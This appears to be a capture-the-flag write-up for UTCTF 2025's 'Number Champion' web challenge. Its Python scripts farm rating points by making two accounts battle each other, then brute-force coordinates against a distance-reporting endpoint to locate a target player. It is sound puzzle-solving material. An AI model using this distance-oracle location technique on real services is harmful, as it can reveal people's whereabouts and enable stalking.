---
title: Number Champion
description: |
  The number 1 player in this game, geopy hit 3000 elo last week. I want to figure out where they train to be the best.

  Flag is the address of this player (according to google maps), in the following format all lowercase:

  utflag{<street-address>-<city>-<zip-code>}

  For example, if the address is 110 Inner Campus Drive, Austin, TX 78705, the flag would be utflag{110-inner-campus-drive-austin-78705}

  By Samintell (@Samintell on discord)
  https://numberchamp-challenge.utctf.live/ 
categories: ["ctf", "UTCTF 2025"]
tags: ["web"]
media_subpath: "/assets/posts/2025/utctf/number-champion"
---

Looking at the page source code we find a long JavaScript code we can beautify to get this:

```js
let userUUID = null,
    opponentUUID = null;
var lat = 0,
    lon = 0;
async function findMatch() {
    const e = await fetch(`/match?uuid=${userUUID}&lat=${lat}&lon=${lon}`, {
            method: "POST"
        }),
        t = await e.json();
    t.error ? alert(t.error) : (opponentUUID = t.uuid, document.getElementById("match-info").innerText = `Matched with ${t.user} (Elo: ${t.elo}, Distance: ${Math.round(t.distance)} miles)`, document.getElementById("match-section").style.display = "none", document.getElementById("battle-section").style.display = "block")
}
async function battle() {
    const e = document.getElementById("number-input").value;
    if (!e) return void alert("Please enter a number.");
    const t = await fetch(`/battle?uuid=${userUUID}&opponent=${opponentUUID}&number=${e}`, {
            method: "POST"
        }),
        n = await t.json();
    n.error ? alert(n.error) : (document.getElementById("battle-result").innerText = `Result: ${n.result}. Opponent's number: ${n.opponent_number}. Your new Elo: ${n.elo}`, document.getElementById("user-info").innerText = `Your updated Elo: ${n.elo}`, document.getElementById("battle-section").style.display = "none", document.getElementById("match-section").style.display = "block")
}
window.onload = async () => {
    if (navigator.geolocation) navigator.geolocation.getCurrentPosition((async e => {
        lat = e.coords.latitude, lon = e.coords.longitude;
        const t = await fetch(`/register?lat=${lat}&lon=${lon}`, {
                method: "POST"
            }),
            n = await t.json();
        userUUID = n.uuid, document.getElementById("user-info").innerText = `Welcome, ${n.user}! Elo: ${n.elo}`
    }));
    else {
        alert("Geolocation is not supported by this browser.");
        const e = await fetch(`/register?lat=${lat}&lon=${lon}`, {
                method: "POST"
            }),
            t = await e.json();
        userUUID = t.uuid, document.getElementById("user-info").innerText = `Welcome, ${t.user}! Elo: ${t.elo}`
    }
};
```

We can register ourselves with a custom location, then find users to battle with.

Calling the routes is a bit questionable (`POST` with query string?)

After registering, we get a random username and UUID and an elo of 1000:

![](1.png)

Calling `/match` gives us an opponent with a similar elo:

![](2.png)

When battling we have to choose a number. However, the opponent will always choose a greater number, so we lose elo:

![](3.png)

From the challenge description we know that we have to get to elo 3000, but how can we do that without losing? Well,
one player wins and another loses. We can create 2 accounts, choose a "winner" and a "loser" and constantly battle them 
until the "winner" gets to 3000. We can automate this:

```py
import requests
from concurrent.futures import ThreadPoolExecutor

loser = "ddacfd7d-7323-4e8a-863a-a039ea5a0814"
winner = "6a5fd043-99b7-4b07-aeb8-6f6a4c08cb61"
url = f"https://numberchamp-challenge.utctf.live/battle?uuid={loser}&opponent={winner}&number=0"

def make_request(_):
    try:
        response = requests.post(url)
        print(response.content)
    except Exception as e:
        print(e)

with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(make_request, range(1000))
```

After running the script, we see that we are matched with the desired user:

![](4.png)

We need to know their location. Notice that the `/match` route has optional coordinates, and the `distance` is
updated accordingly. There probably is some smart formula (triangulation maybe?) to get the exact coordinates, but
I just bruteforced the coordinates (integer only) until the distance got smaller:

```py
import requests
import traceback
from concurrent.futures import ThreadPoolExecutor
import threading

best = None
lock = threading.Lock()

url = "https://numberchamp-challenge.utctf.live/match?uuid=bc11d776-ee1b-4d90-bab5-7ff0ca287656&lat={}&lon={}"

def make_request(lat, long):
    try:
        global best
        response = requests.post(url.format(lat, long))
        distance = response.json()["distance"]
        print(lat, long, distance)
        with lock:
            if best is None or distance < best[0]:
                best = (distance, (lat, long))
    except Exception as e:
        print(e)


with ThreadPoolExecutor(max_workers=200) as executor:
    for lat in range(-89, 89 + 1):
        for long in range(-89, 89 + 1):
            executor.submit(make_request, lat, long)
```

We get coordinates `(40, -83)` with a distance of `4.114477087727994`. We can then try floating point numbers
for the coordinates to further minimize the distance. Best I could get to was `(39.9404, -82.9967)`.

![](5.png)

There is a Starbucks nearby, whose location was the flag:

![](6.png)
